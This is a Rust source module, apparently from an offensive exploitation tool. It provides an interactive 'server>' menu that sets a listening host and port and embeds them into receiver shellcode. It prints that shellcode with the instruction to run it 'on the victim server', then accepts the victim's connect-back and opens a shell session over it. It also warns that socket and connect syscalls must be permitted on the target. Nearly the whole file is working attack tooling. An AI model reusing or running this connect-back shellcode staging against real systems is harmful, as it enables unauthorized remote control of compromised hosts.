use colored::Colorize;
use syscalls::Sysno;
use std::{error::Error, io::{self, Write}, net::{TcpListener, ToSocketAddrs, IpAddr}};

use crate::{config::{Config, ScFmt}, util::{print_shellcode_quoted, print_shellcode_hex, print_info, close_connection, print_error}, shellcode::{SYS_READ_RECEIVER, SYS_RECVFROM_RECEIVER}, syscall, shell};
use crate::util::{print_success, print_warning, print_failed};

fn help() {
    print!("
    Core Commands
    ============= 

        Command                Description
        -------                -----------
        options                List all options
        set <option> <value>   Set option
        run                    Start server
        close                  Close server
        back                   Back to menu
");
}

fn option_help(config: &mut Config) {
    print!("
    Options
    =======

        Option        Value           Description
        ------        -----           -----------
        host          {:<16}Server host
        port          {:<16}Server port
        format        {:<16}Shellcode format
        read_syscall  {:<16}Read syscall


    Available Syscalls
    ==================

        Verb          Syscalls
        ----          --------
        read_syscall  SYS_read, SYS_recvfrom

    Shellcode Formats
    ==================

        Format        Example
        -------       -------
        quoted        \"\\xde\\xad\\xbe\\xef\"
        hex           deadbeef
", config.server_host, config.server_port, config.sc_fmt, config.read_syscall);
}

fn set(config: &mut Config, option: &str, value: &str) {
    match option {
        "host" => {
            let server_sock_addr = format!("{}:{}", value, config.server_port);
            let addrs_iter = server_sock_addr.to_socket_addrs();
            match addrs_iter {
                Ok(iter) => {
                    let mut found = false;
                    // If there are multiple IPs, just pick the first ipv4
                    for server_socket_addr in iter {
                        let ip = server_socket_addr.ip();
                        if let IpAddr::V4(ipv4_addr) = ip {
                            config.server_host = ipv4_addr;
                            found = true;
                            let message = format!("Host set to '{}'", config.server_host.to_string());
                            print_success(&message);
                            break;
                        }
                    }
                    if !found {
                        let message= format!("Error: no ip matched to {}", value);
                        print_failed(&message);
                    }
                },
                Err(err) => {
                    print_error(Box::new(err));
                },
            }
        },
        "port" => {
            if let Ok(port) = value.parse::<u16>() {
                config.server_port = port;
                let message = format!("Port set to '{}'", config.server_port);
                print_success(&message);
            } else {
                let message= format!("Error: invalid port '{}'", value);
                print_failed(&message);
            }
        },
        "format" => {
            match value {
                "quoted" => {
                    config.sc_fmt = ScFmt::ScFmtQuoted;
                },
                "hex" => {
                    config.sc_fmt = ScFmt::ScFmtHex;
                },
                _ => {
                    let message= format!("Error: invalid format '{}'", value);
                    print_failed(&message);
                    return;
                }
            }
            let message = format!("Format set to '{}'", config.sc_fmt);
            print_success(&message);
        },
        "read_syscall" => {
            match value {
                "SYS_read" | "read" => {
                    config.read_syscall = syscall::SYS_READ;
                },
                "SYS_recvfrom" | "recvfrom" => {
                    config.read_syscall = syscall::SYS_RECVFROM;
                },
                _ => {
                    let error_message= format!("Error: invalid syscall '{}'", value);
                    print_failed(&error_message);
                    return;
                },
            }
            let message = format!("Format set to '{}'", config.read_syscall);
            print_success(&message);
        },
        _ => {
            let message = format!("Invalid option '{}'", option);
            print_failed(&message);
        }
    }
}

fn run(config: &mut Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_some() {
        return Err("Server already connected".into());
    }

    let server_sock_addr = format!("{}:{}", config.server_host.to_string(), config.server_port);
    let listener = TcpListener::bind(&server_sock_addr)?;

    print_info("Run the following shellcode on the victim server:");

    let read_receiver = match config.open_syscall.sysno {
        Sysno::read => SYS_READ_RECEIVER,
        Sysno::recvfrom => SYS_RECVFROM_RECEIVER,
        _ => SYS_READ_RECEIVER,
    };
    let mut read_shellcode = read_receiver.shellcode.to_vec();
    let host_octets = config.server_host.octets();
    for i in 0..4 {
        read_shellcode[read_receiver.host_index + i] = host_octets[i];
    }
    let server_port_bytes = config.server_port.to_be_bytes();
    for i in 0..2 {
        read_shellcode[read_receiver.port_index + i] = server_port_bytes[i];
    }

    match config.sc_fmt {
        ScFmt::ScFmtQuoted => print_shellcode_quoted(&read_shellcode),
        ScFmt::ScFmtHex => print_shellcode_hex(&read_shellcode),
    }

    let waiting_connecion_msg = format!("Waiting for connection on {}", &server_sock_addr);
    print_info(&waiting_connecion_msg);

    let (conn, conn_addr) = listener.accept()?;
    let conn_sock_addr = conn_addr.to_string();
    let connection_established_msg = format!("Connection established from {}", &conn_sock_addr);
    print_success(&connection_established_msg);

    config.conn = Some(conn);

    shell::prompt(config)?;

    Ok(())
}

pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
    let ps = "server>".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    let allowed_msg = format!("{} and {} should be allowed", "SYS_socket".bold(), "SYS_connect".bold());
    print_warning(&allowed_msg);

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{} ", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            break;
        }
        let cmds = shlex::split(&line).unwrap_or_default();
        if cmds.len() == 0 {
            help();
            continue;
        }
        let command = cmds[0].as_ref();
        match command {
            "help" => {
                help();
            },
            "options" => {
                option_help(config);
            },
            "set" => {
                if cmds.len() == 1 {
                    print_failed("No option specified");
                    help();
                } else if cmds.len() == 2 {
                    print_failed("No value specified");
                    help();
                } else {
                    let option = cmds[1].as_ref();
                    let value = cmds[2].as_ref();
                    set(config, option, value);
                }
            },
            "run" => {
                if let Err(err) = run(config) {
                    print_error(err);
                }
            },
            "close" => {
                close_connection(config);
            },
            "back" => {
                break;
            },
            _ => {
                let message = format!("Unknown command {}", command);
                print_failed(&message);
                help();
            }
        }
    }

    println!("");
    Ok(())
}
